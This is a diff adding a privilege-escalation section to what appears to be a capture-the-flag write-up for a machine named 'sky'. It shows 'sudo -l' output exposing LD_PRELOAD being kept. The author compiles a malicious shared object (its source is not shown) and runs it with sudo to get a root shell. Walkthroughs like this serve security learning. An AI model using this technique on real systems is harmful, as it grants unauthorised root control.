@@ -154,8 +154,35 @@ user
 + Command "sudo -l":
 
 ```bash
+webdeveloper@sky:~$ sudo -l
+Matching Defaults entries for webdeveloper on sky:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    env_keep+=LD_PRELOAD
 
+User webdeveloper may run the following commands on sky:
+    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
 ```
+--> We can priv escalation with "env_keep+=LD_PRELOAD"
 
+![alt text](image-12.png)
 
-
+```bash
+webdeveloper@sky:~$ cd /tmp
+webdeveloper@sky:/tmp$ touch shell.c
+webdeveloper@sky:/tmp$ nano shell.c 
+webdeveloper@sky:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+webdeveloper@sky:/tmp$ ls
+mongodb-27017.sock
+shell.c
+shell.so
+systemd-private-d89da45fb20b486ea30378c0f953b467-apache2.service-LNytqi
+systemd-private-d89da45fb20b486ea30378c0f953b467-systemd-logind.service-ssFq8g
+systemd-private-d89da45fb20b486ea30378c0f953b467-systemd-resolved.service-7YnZof
+systemd-private-d89da45fb20b486ea30378c0f953b467-systemd-timesyncd.service-cfwohi
+webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility 
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+```
+END!!!
